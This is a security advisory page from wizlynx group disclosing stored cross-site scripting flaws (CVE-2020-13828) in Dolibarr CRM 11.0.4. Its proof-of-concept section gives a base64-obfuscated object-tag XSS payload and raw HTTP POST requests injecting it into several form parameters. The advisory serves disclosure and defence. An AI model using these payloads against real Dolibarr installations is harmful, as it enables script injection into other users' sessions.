=== Content from www.wizlynxgroup.com_42eba532_20250119_112500.html ===


[![wizlynx group | IT Security Services](/content/images/logo-nav.png)](/ch/de/)

[Contact Us](../../contact)

# Security Research & Advisories

### Multiple Stored Cross-Site Scripting Vulnerabilities in Dolibarr CRM

| Vendor |  |
| --- | --- |
| Product | Dolibarr |
| Affected Version(s) | 11.0.4 and probably prior |
| Tested Version(s) | 11.0.4 |
| Vendor Notification | May 27, 2020 |
| Advisory Publication | May 27, 2020 [without technical details] |
| Vendor Fix | Version 11.0.5 |
| Public Disclosure | August 25, 2020 |
| Latest Modification | August 25, 2020 |
| CVE Identifier(s) | [CVE-2020-13828](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13828) |
| Product Description | Dolibarr ERP/CRM is an open source, free software package for small and medium companies, foundations or freelancers. It includes different features for enterprise resource planning (ERP) and customer relationship management (CRM) but also other features for different activities. |
| Credits | Luis Noriega, Security Researcher & Penetration Tester @wizlynx group |

## **Vulnerability Details**

| **Stored Cross-Site Scripting (XSS) Vulnerability** | | | |
| --- | --- | --- | --- |
| **Severity**: **Medium** | **CVSS Score**: 6.1 | **CWE-ID**: [**CWE-79**](https://cwe.mitre.org/data/definitions/79) | **Status**: Not Fixed |
| **Vulnerability Description** | | | |
| The application Dolibarr CRM is affected by multiple stored Cross-Site Scripting (XSS) vulnerabilities affecting version 11.0.4 and probably prior versions. These vulnerabilities could allow remote authenticated attackers to inject arbitrary web script or HTML. | | | |
| **CVSS Base Score** | | | |
| **Attack Vector** | Network | **Scope** | Changed |
| **Attack Complexity** | Low | **Confidentiality Impact** | Low |
| **Privileges Required** | None | **Integrity Impact** | Low |
| **User Interaction** | Required | **Availability Impact** | None |

## **Description**

Dolibarr has multiple stored Cross-Site Scripting (XSS) vulnerabilities due to the lack of input validation and output encoding.

## **PoC**

### Example #1

The following payload was successfully submitted to the server in the label parameter:

*<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>*

This input was echoed unmodified in the application's response resulting in a Cross-Site Scripting (see request below).

POST /dolibarr/product/card.php?id=2 HTTP/1.1

â¦

token=%242y%2410%24A.bF3SJr4WvTRsxUfLwnEemzTF68V3mEfgYBJeYSs2%2FRQBB3JvWFy&action=update&id=2&canvas=&ref=123455667&label=%3Cobject+data%3D%27data%3Atext%2Fhtml%3B%3B%3B%3B%3Bbase64%2CPHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg%3D%3D%27%3E%3C%2Fobject%3E&statut=1&statut\_buy=1&barcode=&desc=%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%26nbsp%3B&url=&finished=-1&weight=&weight\_units=0&size=&sizewidth=&sizeheight=&size\_units=0&surface=&surface\_units=0&volume=&volume\_units=0&customcode=&country\_id=&accountancy\_code\_sell=&accountancy\_code\_sell\_export=&accountancy\_code\_buy=

Payload:

<object+data ='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

Where:

âPHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg==â = <script>alert("@nogagmx")</script>

The following screenshot shows both the request and response:

![](/content/images/vuln/dolibarr_19.png)

The following screenshot shows the JavaScript being executed on the client side:

![](/content/images/vuln/dolibarr_20.png)

---

### Example #2

Additionally, it was possible to inject our malicious payload in the **name\_alias parameter** (Third-party Section) as shown in the following request:

POST /dolibarr/societe/card.php?socid=4 HTTP/1.1

â¦

â¦

-----------------------------5276315661579106896916459915

Content-Disposition: form-data; name="name"

test xss

-----------------------------5276315661579106896916459915

Content-Disposition: form-data; name="name\_alias"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

The following screenshot shows both the request and response:

![](/content/images/vuln/dolibarr_21.png)
![](/content/images/vuln/dolibarr_22.png)

After following the redirection, the payload is shown in the application response without any codification.

![](/content/images/vuln/dolibarr_23.png)

The following screenshot shows the JavaScript being executed on the client side:

![](/content/images/vuln/dolibarr_24.png)

---

### Other affected pages & parameters:

**customcode** parameter â *Product Section*

POST /dolibarr/product/card.php?id=2 HTTP/1.1

â¦

token=%242y%2410%24A.bF3SJr4WvTRsxUfLwnEemzTF68V3mEfgYBJeYSs2%2FRQBB3JvWFy&action=update&id=2&canvas=&ref=123455667&label=test&statut=1&statut\_buy=1&barcode=&desc=%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%26nbsp%3B&url=&finished=-1&weight=&weight\_units=0&size=&sizewidth=&sizeheight=&size\_units=0&surface=&surface\_units=0&volume=&volume\_units=0&**customcode**=%3Cobject+data%3D%27data%3Atext%2Fhtml%3B%3B%3B%3B%3Bbase64%2CPHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg%3D%3D%27%3E%3C%2Fobject%3E&country\_id=&accountancy\_code\_sell=&accountancy\_code\_sell\_export=&accountancy\_code\_buy=

**subject** parameter â *Ticket Section*

POST /dolibarr/ticket/card.php?action=create&idmenu=21&mainmenu=ticket&leftmenu= HTTP/1.1

â¦

-----------------------------1968352102747999012167307275

Content-Disposition: form-data; name="category\_code"

OTHER

-----------------------------1968352102747999012167307275

Content-Disposition: form-data; name="**subject**"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

-----------------------------1968352102747999012167307275

Content-Disposition: form-data; name="message"

**societe** parameter â *Member Section*

POST /dolibarr/adherents/card.php HTTP/1.1

â¦

Content-Disposition: form-data; name="morphy"

phy

-----------------------------20235881561969443630462327924

Content-Disposition: form-data; name="typeid"

1

-----------------------------20235881561969443630462327924

Content-Disposition: form-data; name="**societe**"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

**address** parameter â *Member Section*

POST /dolibarr/adherents/card.php HTTP/1.1

â¦

Content-Disposition: form-data; name="member\_email"

-----------------------------1029758512301943784456065998

Content-Disposition: form-data; name="**address**"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

**message** parameter â *Ticket Section*

POST /dolibarr/ticket/card.php?action=create&idmenu=21&mainmenu=ticket&leftmenu= HTTP/1.1

â¦

-----------------------------1366952982792511851202536362

Content-Disposition: form-data; name="subject"

dfdfdfdfdfdfd

-----------------------------1366952982792511851202536362

Content-Disposition: form-data; name="**message**"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

**barcode**  parameter â *Third-party Section*

POST /dolibarr/societe/card.php?socid=5 HTTP/1.1

â¦

Content-Disposition: form-data; name="**barcode**"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

-----------------------------1613565241541576224808100738

Content-Disposition: form-data; name="status"

open

**address**  parameter â *Third-party Section*

POST /dolibarr/societe/card.php?socid=5 HTTP/1.1

â¦

Content-Disposition: form-data; name="**address**"

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgiQG5vZ2FnbXgiKTwvc2NyaXB0Pg=='></object>

-----------------------------1613565241541576224808100738

Content-Disposition: form-data; name="zipcode"

-----------------------------1613565241541576224808100738

[Top](#0)

![wizlynx group | IT Security Services](/content/images/WhiteWithRed.png)

wizlynx has not only built a solid foundation of information security, quality and project management know-how, but our associates are known for their ability to apply the right soft skills at the right time to best serve our customers. We make it a point to understand the infrastructure, needs and challenges of our customers, which enables us to deliver fast, effective and high quality results. It is our belief that this level of understanding can only be obtained with the most capable and experienced resources. Reach out to our associates at any time through our interactive competence centers to draw upon our knowledge of processes, procedures, guidelines and tools. Youâll be able to see, firsthand, the value our team will add to your organization.

---

---

©2024 wizlynx group - All Rights Reserved

* [Terms of Use](/terms-of-use)
* [Privacy](/privacy)


